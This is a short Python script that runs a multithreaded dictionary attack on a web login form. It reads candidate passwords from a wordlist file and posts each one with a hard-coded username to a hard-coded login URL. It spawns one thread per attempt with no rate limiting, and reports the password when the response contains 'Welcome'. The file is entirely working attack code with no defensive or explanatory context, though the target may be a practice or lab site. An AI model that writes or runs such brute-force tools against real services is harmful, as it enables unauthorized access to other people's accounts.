import requests
import time
import threading

acc = "asayami"  # account
dickt = "dict.txt"  # passwords list
isFinished = False  # check if finish or not


def validator(password):  # check if the password satisfies the condition
    return True


def send_request(username, password):
    post_data = {"username": username, "password": password}
    url = "https://villvcorp.com/login/index.php"
    post_response = requests.post(url, data=post_data)
    responseDetector(post_response.text, password)


def responseDetector(resp, passwd):  # check whether it is successful or not
    if "Welcome" in resp:
        global isFinished
        isFinished = True
        print("Result: " + passwd)


def count_lines(filename):  # count the number of rows in the file
    with open(filename, "r") as file:
        lines = file.readlines()
    return len(lines)


def display(cur, total):  # display progress
    temp = cur / total * 100
    tempStr = f"{temp:.2f}"
    print(str(cur) + "/" + str(total) + "\t" + tempStr + "%")


def main():
    numberOfLine = count_lines(dickt)
    count = 0
    start_time = time.perf_counter()
    threads = []
    with open(dickt, "r") as file:
        for line in file:
            if isFinished is False:
                passwd = line.strip()
                if validator(passwd):
                    thread = threading.Thread(
                        target=send_request,
                        args=(
                            acc,
                            passwd,
                        ),
                    )
                    count += 1
                    display(count, numberOfLine)
                    thread.start()
                    threads.append(thread)
            else:
                break
    for thread in threads:  # Wait for all threads to finish
        thread.join()
    end_time = time.perf_counter()
    execution_time = end_time - start_time
    print(f"Execution time: {execution_time:.2f} seconds")


if __name__ == "__main__":
    main()
